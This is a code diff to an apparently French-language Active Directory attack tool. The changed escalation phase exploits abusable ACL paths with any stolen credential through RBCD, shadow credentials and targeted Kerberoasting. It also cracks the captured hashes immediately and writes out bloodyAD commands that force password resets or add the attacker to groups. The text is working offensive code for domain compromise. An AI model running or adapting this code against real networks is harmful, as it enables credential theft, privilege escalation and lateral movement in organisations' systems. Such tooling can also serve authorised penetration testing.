@@ -1530,8 +1530,10 @@ def phase4_escalation(hosts, args, state):
     stage("PHASE 4 - ESCALADE & LATERAL")
     dc = first_dc(state["hosts"])
 
-    # 1) exploitation active des ACL abusables (shadow creds / RBCD) qu'on controle
+    # 1) exploitation active des ACL abusables (shadow creds / RBCD / targeted roast)
     abuse_acl_paths(args, state, dc)
+    # crack immediat des hashes obtenus (ex: targeted kerberoast -> JERRI) -> nouveau cred
+    crack_hashes(args, state)
 
     # 2) cartographie des creds -> hotes (admin local ?) + RCE + secretsdump
     nxc = nxc_bin()
@@ -1991,36 +1993,51 @@ def targeted_kerberoast(args, state, dc, target):
                     f"hashcat -m 13100 {outfile} (cracke auto en boucle)", dc)
 
 def abuse_acl_paths(args, state, dc):
-    """Weaponise les ACL abusables qu'on controle (shadow creds / RBCD / targeted roast)."""
+    """Weaponise les ACL abusables : on exploite un chemin des qu'on POSSEDE le cred
+    du principal 'from' (peu importe l'utilisateur courant), en s'authentifiant avec."""
     paths = state.get("acl_paths", [])
     if not paths:
         return
-    me = (args.user or "").lower()
-    log(f"\n{C.GR}[i] Exploitation de {len(paths)} chemin(s) ACL...{C.X}")
+    # creds qu'on possede : user.lower() -> cred
+    owned = {}
+    for c in state.get("creds", []):
+        if c.get("user"):
+            owned.setdefault(c["user"].lower(), c)
+    if args.user and args.user.lower() not in owned:
+        owned[args.user.lower()] = {"user": args.user, "password": args.password, "hash": args.nthash}
+    log(f"\n{C.GR}[i] Exploitation de {len(paths)} chemin(s) ACL "
+        f"({len(owned)} principal(aux) controle(s))...{C.X}")
     done = set()
     for p in paths:
         frm, to, rights = p.get("from", ""), p.get("to", ""), p.get("rights", [])
-        if (frm, to) in done:
+        if (frm.lower(), to.lower()) in done:
             continue
-        done.add((frm, to))
+        done.add((frm.lower(), to.lower()))
         strong = any(r in rights for r in ("GenericAll", "GenericWrite", "WriteDACL",
                                            "WriteOwner", "AllExtendedRights",
                                            "Write-SPN", "Write-KeyCredentialLink"))
-        if frm.lower() != me:   # on n'exploite que ce qu'on controle
+        cred = owned.get(frm.lower())
+        if not cred:   # on ne controle pas 'from' -> on documente
             add_finding(state, "HIGH", f"Chemin ACL : {frm} -> {'/'.join(rights)} sur {to}",
                         f"prends le controle de {frm} pour l'exploiter")
             continue
-        if to.endswith("$") and strong:
-            abuse_rbcd(args, state, dc, to)
-        elif strong:
-            abuse_shadow_credentials(args, state, dc, to)   # via ADCS/PKINIT
-            targeted_kerberoast(args, state, dc, to)        # alternative sans ADCS
-        elif "ForceChangePassword" in rights:
-            add_finding(state, "HIGH", f"ForceChangePassword sur {to} (destructif)",
-                        f"bloodyAD -u {args.user} set password {to} 'Newp@ss1!'")
-        elif "Self-Membership(AddMember)" in rights:
-            add_finding(state, "HIGH", f"AddMember : ajoute-toi au groupe {to}",
-                        f"bloodyAD add groupMember {to} {args.user}")
+        # on possede 'from' -> on exploite AVEC ses creds (bascule temporaire)
+        saved = (args.user, args.password, args.nthash)
+        args.user, args.password, args.nthash = cred.get("user"), cred.get("password"), cred.get("hash")
+        try:
+            if to.endswith("$") and strong:
+                abuse_rbcd(args, state, dc, to)
+            elif strong:
+                abuse_shadow_credentials(args, state, dc, to)   # via ADCS/PKINIT
+                targeted_kerberoast(args, state, dc, to)        # alternative sans ADCS
+            elif "ForceChangePassword" in rights:
+                add_finding(state, "HIGH", f"ForceChangePassword sur {to} (destructif)",
+                            f"bloodyAD -u {cred.get('user')} set password {to} 'Newp@ss1!'")
+            elif "Self-Membership(AddMember)" in rights:
+                add_finding(state, "HIGH", f"AddMember : ajoute-toi au groupe {to}",
+                            f"bloodyAD add groupMember {to} {cred.get('user')}")
+        finally:
+            args.user, args.password, args.nthash = saved
 
 # ======================================================================
 # PHASE 5 : RAPPORT
